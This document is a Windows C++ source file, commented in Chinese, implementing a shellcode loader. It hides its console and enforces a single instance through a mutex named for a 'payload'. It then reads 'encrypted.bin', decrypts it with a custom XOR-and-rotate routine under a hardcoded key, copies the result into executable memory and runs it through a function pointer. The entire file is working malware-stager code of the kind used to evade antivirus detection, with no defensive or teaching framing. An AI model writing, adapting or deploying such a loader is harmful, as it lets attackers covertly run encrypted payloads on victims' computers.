#include <windows.h>
#include <strsafe.h>

// 辅助函数：将格式化字符串输出到调试器
void DebugPrint(const char* format, ...)
{
    char    buffer[1024];
    va_list args;
    va_start(args, format);
    StringCchVPrintfA(buffer, sizeof(buffer), format, args);
    va_end(args);
    OutputDebugStringA(buffer);
}

// 私有解密函数
BOOL CustomDecrypt(const unsigned char* encrypted, SIZE_T size, unsigned char** decrypted, SIZE_T* decryptedSize)
{
    *decrypted     = nullptr;
    *decryptedSize = 0;

    if (size == 0 || !encrypted)
        return FALSE;

    unsigned char* buffer = (unsigned char*)malloc(size);
    if (!buffer)
        return FALSE;

    const char* key_stream = "MyPr1v4t3K3y!";
    size_t      key_len    = strlen(key_stream);

    for (SIZE_T i = 0; i < size; ++i)
    {
        unsigned char byte = encrypted[i];
        // 解密是加密的逆过程
        byte ^= (key_stream[i % key_len] ^ 0x55); // 逆 XOR2
        int shift = key_stream[i % key_len] % 7 + 1;
        byte      = ((byte >> shift) | (byte << (8 - shift))) & 0xFF; // 循环右移
        byte      = (byte - (unsigned char)i) & 0xFF;                 // 注意：确保无符号运算
        byte ^= key_stream[i % key_len];                              // 逆 XOR1
        buffer[i] = byte;
    }

    *decrypted     = buffer;
    *decryptedSize = size;
    return TRUE;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine,
                      _In_ int nCmdShow)
{
    HANDLE hMutex = ::CreateMutex(NULL, TRUE, L"Global\\MyUniquePayloadMutex123");
    if (hMutex == NULL)
    {
        DebugPrint("[!] 创建互斥体失败。错误码: %d\n", GetLastError());
        return 1;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        DebugPrint("[*] 程序已在运行，退出实例\n");
        CloseHandle(hMutex);
        return 0;
    }

    // 隐藏控制台（如果存在）
    FreeConsole();

    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH))
    {
        DebugPrint("[!] 获取模块路径失败。错误码: %d\n", GetLastError());
        CloseHandle(hMutex);
        return 1;
    }

    char* lastSlash = strrchr(path, '\\');
    if (lastSlash)
        *lastSlash = 0;

    // 使用安全的字符串拼接
    if (FAILED(StringCchCatA(path, MAX_PATH, "\\encrypted.bin")))
    {
        DebugPrint("[!] 路径拼接失败\n");
        CloseHandle(hMutex);
        return 1;
    }

    DebugPrint("[*] 尝试打开文件: %s\n", path);

    // 1. 打开 encrypted.bin 文件
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DebugPrint("[!] 无法打开 encrypted.bin 文件。错误码: %d\n", GetLastError());
        CloseHandle(hMutex);
        return 1;
    }

    // 2. 获取文件大小
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE)
    {
        DebugPrint("[!] 获取文件大小失败。错误码: %d\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(hMutex);
        return 1;
    }

    DebugPrint("[*] Shellcode 文件大小: %d 字节\n", fileSize);

    if (fileSize == 0)
    {
        DebugPrint("[!] 文件大小为0\n");
        CloseHandle(hFile);
        CloseHandle(hMutex);
        return 1;
    }

    // 3. 读取加密数据到缓冲区
    unsigned char* encryptedData = (unsigned char*)malloc(fileSize);
    if (!encryptedData)
    {
        DebugPrint("[!] 分配加密数据缓冲区失败\n");
        CloseHandle(hFile);
        CloseHandle(hMutex);
        return 1;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, encryptedData, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        DebugPrint("[!] 读取文件失败。错误码: %d\n", GetLastError());
        free(encryptedData);
        CloseHandle(hFile);
        CloseHandle(hMutex);
        return 1;
    }
    CloseHandle(hFile);

    DebugPrint("[*] Shellcode 已成功读取到内存。\n");

    // 4. 解密Shellcode
    unsigned char* decryptedShellcode = nullptr;
    SIZE_T         decryptedSize      = 0;
    if (!CustomDecrypt(encryptedData, fileSize, &decryptedShellcode, &decryptedSize))
    {
        DebugPrint("[!] Shellcode 解密失败\n");
        free(encryptedData);
        CloseHandle(hMutex);
        return 1;
    }

    free(encryptedData); // 不再需要加密数据
    DebugPrint("[*] Shellcode 解密成功，大小: %zu 字节\n", decryptedSize);

    // 5. 申请可执行内存
    LPVOID execMem = VirtualAlloc(NULL, decryptedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL)
    {
        DebugPrint("[!] VirtualAlloc 失败。错误码: %d\n", GetLastError());
        free(decryptedShellcode);
        CloseHandle(hMutex);
        return 1;
    }

    DebugPrint("[*] 可执行内存已分配在地址: 0x%p\n", execMem);

    // 6. 复制解密后的Shellcode到可执行内存
    memcpy(execMem, decryptedShellcode, decryptedSize);

    // 7. 释放解密缓冲区
    free(decryptedShellcode);

    // 8. 可选：更改内存保护为只执行（更安全）
    DWORD oldProtect;
    if (!VirtualProtect(execMem, decryptedSize, PAGE_EXECUTE_READ, &oldProtect))
    {
        DebugPrint("[!] VirtualProtect 失败，但继续执行。错误码: %d\n", GetLastError());
    }

    // 9. 添加一些调试信息
    DebugPrint("[*] Shellcode 起始地址: 0x%p\n", execMem);
    DebugPrint("[*] Shellcode 结束地址: 0x%p\n", (char*)execMem + decryptedSize);
    DebugPrint("[*] 准备执行Shellcode...\n");

    // 10. 执行Shellcode
    __try
    {
        // 将Shellcode转换为函数指针并调用
        void (*shellcodeFunc)() = (void (*)())execMem;
        shellcodeFunc();

        DebugPrint("[*] Shellcode 执行完毕\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DebugPrint("[!] Shellcode 执行时发生异常。错误码: 0x%08X\n", GetExceptionCode());

        // 释放资源
        VirtualFree(execMem, 0, MEM_RELEASE);
        CloseHandle(hMutex);
        return 1;
    }

    // 11. 清理资源（通常执行不到这里，除非Shellcode返回）
    DebugPrint("[!] Shellcode 已返回，清理资源...\n");
    VirtualFree(execMem, 0, MEM_RELEASE);
    CloseHandle(hMutex);

    return 0;
}
